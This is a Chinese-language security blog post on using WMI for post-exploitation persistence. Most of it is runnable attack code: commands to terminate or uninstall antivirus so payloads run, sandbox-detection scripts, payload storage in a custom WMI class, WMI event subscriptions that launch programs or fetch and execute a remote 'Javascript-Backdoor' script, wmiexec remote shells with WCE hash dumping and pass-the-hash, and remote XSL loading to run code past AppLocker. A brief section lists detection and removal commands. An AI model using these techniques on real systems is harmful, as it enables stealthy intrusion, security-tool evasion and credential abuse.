<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 权限维持-WMI · Uknow - Stay hungry Stay foolish</title><meta name="description" content="权限维持-WMI - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">权限维持-WMI</h1><div class="post-time">Apr 1, 2019</div><div class="post-content"><h3><span id="wmi">WMI</span></h3><p>WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。</p>
<h4><span id="检索系统信息">检索系统信息</span></h4><h5><span id="检索系统已安装的软件">检索系统已安装的软件</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_1.png" alt="wmic_1"></p>
<h5><span id="搜索系统运行服务">搜索系统运行服务</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_2.png" alt="wmic_1"></p>
<h5><span id="搜索运行中的程序">搜索运行中的程序</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_3.png" alt="wmic_3"></p>
<h5><span id="搜索启动程序">搜索启动程序</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_4.png" alt="wmic_4"></p>
<h5><span id="搜索共享驱动盘">搜索共享驱动盘</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic netuser list brief |more</span><br></pre></td></tr></table></figure>
<h5><span id="搜索用户名">搜索用户名</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_5.png" alt="wmic_5"></p>
<h5><span id="搜索计算机域控制器">搜索计算机域控制器</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic ntdomain list brief</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_6.png" alt="wmic_6"></p>
<h5><span id="搜索登录用户">搜索登录用户</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logon list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_7.png" alt="wmic_7"></p>
<h5><span id="搜索已安装的安全更新">搜索已安装的安全更新</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list brief |more</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_8.png" alt="wmic_8"></p>
<h4><span id="执行任务">执行任务</span></h4><p>WMIC不仅仅只是用于检索系统信息。在渗透测试中， 使用适当的命令，它也可以执行各种有用的任务。</p>
<h5><span id="卸载和重新安装程序">卸载和重新安装程序</span></h5><p>在渗透测试中， 我们经常遇到反病毒程序阻止payload运行。 这时候我们可以通过WMIC命令来卸载反病毒程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product where &quot;name like &apos;%Office%&apos;&quot; get name</span><br><span class="line">wmic product where name=&quot;Office&quot; call uninstall</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_9.png" alt="wmic_9"></p>
<h4><span id="运行程序管理">运行程序管理</span></h4><p>上面我们提到卸载反病毒程序来运行payload。 但是有时候我们没有足够的权限去卸载程序。 这时我们可以通过WMIC命令来停止运行反病毒服务。</p>
<ol>
<li><p>第一步， 找到反病毒程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where &quot;name like &apos;%forti%&apos;&quot; get name</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li>第二步， 通过WMIC命令来停止运行反病毒服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process where name=&quot;FortiTray.exe&quot; call terminate</span><br></pre></td></tr></table></figure>
<h3><span id="powershell">Powershell</span></h3><p>自从PowerShell的出现，WMI功能已经被完全整合到了PowerShell里面。在PowerShell中， WMI拥有多个类型的种类，每个种类都代表一个内部组件：Win32_proces代表当前系统所运行程序。 Win32_Service代表当前系统所运行服务等等。</p>
<h4><span id="侦查">侦查</span></h4><h5><span id="操作系统相关信息">操作系统相关信息</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_10.png" alt="wmic_10"></p>
<h5><span id="文件目录列表">文件/目录列表</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class CIM_DataFile</span><br></pre></td></tr></table></figure>
<h5><span id="磁盘卷列表">磁盘卷列表</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Volume</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_12.png" alt="wmic_12"></p>
<h5><span id="注册表操作">注册表操作</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv</span><br><span class="line">Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">Get-ItemProperty OptionalComponents</span><br></pre></td></tr></table></figure>
<h5><span id="当前进程">当前进程</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Process</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_14.png" alt="wmic_14"></p>
<h5><span id="列举服务">列举服务</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_15.png" alt="wmic_15"></p>
<h5><span id="日志">日志</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_NtLogEvent</span><br></pre></td></tr></table></figure>
<h5><span id="登陆账户">登陆账户</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_LoggedOnUser</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_15.png" alt="wmic_15"></p>
<h5><span id="共享">共享</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Share</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_17.png" alt="wmic_17"></p>
<h5><span id="补丁">补丁</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_QuickFixEngineering</span><br></pre></td></tr></table></figure>
<h5><span id="杀毒软件">杀毒软件</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct</span><br></pre></td></tr></table></figure>
<h4><span id="虚拟机检测">虚拟机检测</span></h4><p>（1）判断TotalPhysicalMemory和NumberOfLogicalProcessors</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$VMDetected = $False</span><br><span class="line">$Arguments = @&#123;</span><br><span class="line"> Class = &apos;Win32_ComputerSystem&apos;</span><br><span class="line"> Filter = &apos;NumberOfLogicalProcessors &lt; 2 AND TotalPhysicalMemory &lt; 2147483648&apos;</span><br><span class="line">&#125;</span><br><span class="line">if (Get-WmiObject @Arguments) &#123; </span><br><span class="line">$VMDetected = $True</span><br><span class="line">&quot;In vm&quot;</span><br><span class="line"> &#125; </span><br><span class="line"> else&#123;</span><br><span class="line"> &quot;Not in vm&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>（2）判断虚拟机进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$VMwareDetected = $False</span><br><span class="line">$VMAdapter = Get-WmiObject Win32_NetworkAdapter -Filter &apos;Manufacturer LIKE</span><br><span class="line">&quot;%VMware%&quot; OR Name LIKE &quot;%VMware%&quot;&apos;</span><br><span class="line">$VMBios = Get-WmiObject Win32_BIOS -Filter &apos;SerialNumber LIKE &quot;%VMware%&quot;&apos;</span><br><span class="line">$VMToolsRunning = Get-WmiObject Win32_Process -Filter &apos;Name=&quot;vmtoolsd.exe&quot;&apos;</span><br><span class="line">if ($VMAdapter -or $VMBios -or $VMToolsRunning) </span><br><span class="line">&#123; $VMwareDetected = $True </span><br><span class="line">&quot;in vm&quot;</span><br><span class="line">&#125; </span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">&quot;not in vm&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="存储payload">存储payload</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&apos;root\cimv2&apos;, $null,</span><br><span class="line">$null)</span><br><span class="line">$StaticClass.Name = &apos;Win32_EvilClass&apos;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&apos;EvilProperty&apos; , &quot;This is payload&quot;)</span><br><span class="line">$StaticClass.Put()</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_18.png" alt="wmic_18"></p>
<p><strong>Tips：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可加密存储于此位置，执行时解密运行，达到硬盘不存文件的效果</span><br></pre></td></tr></table></figure>
<h4><span id="隐蔽定时启动程序">隐蔽定时启动程序</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$filterName = &apos;BotFilter82&apos;</span><br><span class="line">$consumerName = &apos;BotConsumer23&apos;</span><br><span class="line">$exePath = &apos;C:\Windows\System32\notepad.exe&apos;</span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE</span><br><span class="line">TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;</span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=</span><br><span class="line">$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop</span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath&#125;</span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=</span><br><span class="line">$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_19.png" alt="wmic_19"></p>
<p>查看进程：</p>
<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1553239184506.png" alt="1553239184506"></p>
<p>每60s执行一次notepad.exe</p>
<h4><span id="远程下载js脚本">远程下载js脚本</span></h4><p>通过远程下载js脚本，进行命令调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!powershell</span><br><span class="line">$filterName = &apos;filtP1&apos;</span><br><span class="line">$consumerName = &apos;consP1&apos;</span><br><span class="line">$Command =&quot;GetObject(&quot;&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;&quot;)&quot;    </span><br><span class="line">$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;    </span><br><span class="line">$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=$filterName;EventNameSpace=&quot;root\cimv2&quot;;QueryLanguage=&quot;WQL&quot;;Query=$Query&#125; -ErrorAction Stop    </span><br><span class="line">$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=$consumerName;ScriptingEngine=&apos;JScript&apos;;ScriptText=$Command&#125;    </span><br><span class="line">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=$WMIEventFilter;Consumer=$WMIEventConsumer&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_22.png" alt="wmic_22"></p>
<h3><span id="wmi后门检测及清除">WMI后门检测及清除</span></h3><h4><span id="查看当前wmi-event">查看当前WMI Event</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#List Event Filters</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</span><br><span class="line"></span><br><span class="line">#List Event Consumers</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</span><br><span class="line"></span><br><span class="line">#List Event Bindings</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_21.png" alt="wmic_21"></p>
<h4><span id="清除后门">清除后门</span></h4><p>【管理员权限】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Filter</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter &quot;Name=&apos;BotFilter82&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Consumer</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter &quot;Name=&apos;BotConsumer23&apos;&quot; | Remove-WmiObject -Verbose</span><br><span class="line"></span><br><span class="line">#Binding</span><br><span class="line">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter &quot;__Path LIKE &apos;%</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_19.png" alt="wmic_19"></p>
<h3><span id="wmiexecvbs">wmiexec.vbs</span></h3><p>WMIEXEC是用VBS脚本调用WMI来模拟psexec的功能</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_23.png" alt="wmic_23"></p>
<p>WMIEXEC支持两种模式，一种是半交互式shell模式，另一种是执行单条命令模式。<br>WMIEXEC需要提供账号密码进行远程连接，但是如果没有破解出账号密码，也可以配合WCE的hash注入功能一起使用，先进行hash注入，然后再使用WMIEXEC即可。</p>
<h4><span id="半交互shell模式">半交互shell模式</span></h4><p>提供账号密码，执行如下命令： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 username password</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_24.png" alt="wmic_24"></p>
<p>这样就获得了一个半交互式的shell，这个shell和psexec的shell没什么区别。之所以称为半交互式，是因为这个shell也不能执行实时交互的命令，和psexec是一样的。</p>
<p>如果有时候我们抓取到的是hash，破解不了时可以利用WCE的hash注入，然后再执行WMIEXEC（不提供账号密码）就可以了。</p>
<p>利用wce抓取hash:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -l</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_25.png" alt="wmic_25"></p>
<p>利用wce进行hash注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wce -s Administrator:WIN-2003:F67CE55AC831223DC187B8085FE1D9DF:45A524862326CB9E7D85AF4017A000F0</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_26.png" alt="wmic_26"></p>
<h4><span id="单个命令执行的模式">单个命令执行的模式</span></h4><p>这个模式适用于只需要执行一个命令，或者说当前的环境不是交互式shell，没法运行WMIEXEC的shell模式时（比如在webshell里面)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe  wmiexec.vbs /cmd 192.168.1.1 username password  &quot;command&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_27.png" alt="wmic_27"></p>
<h3><span id="wmic调用xsl文件">wmic调用xsl文件</span></h3><p>本地：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list /FORMAT:evil.xsl</span><br></pre></td></tr></table></figure>
<p>远程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /FORMAT:&quot;https://example.com/evil.xsl&quot;</span><br></pre></td></tr></table></figure>
<p>xsl文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&apos;1.0&apos;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method=&quot;text&quot;/&gt;</span><br><span class="line">    &lt;ms:script implements-prefix=&quot;user&quot; language=&quot;JScript&quot;&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">    var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;);</span><br><span class="line">    ]]&gt; &lt;/ms:script&gt;</span><br><span class="line">&lt;/stylesheet&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl&quot;</span><br></pre></td></tr></table></figure>
<p>执行成功，成功弹出计算器，如下图</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/wmic_28.png" alt="wmic_28"></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/uncategorized/权限维持-注册表.html" class="prev">上一篇</a><a href="/posts/uncategorized/后渗透之meterpreter使用攻略.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2020 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>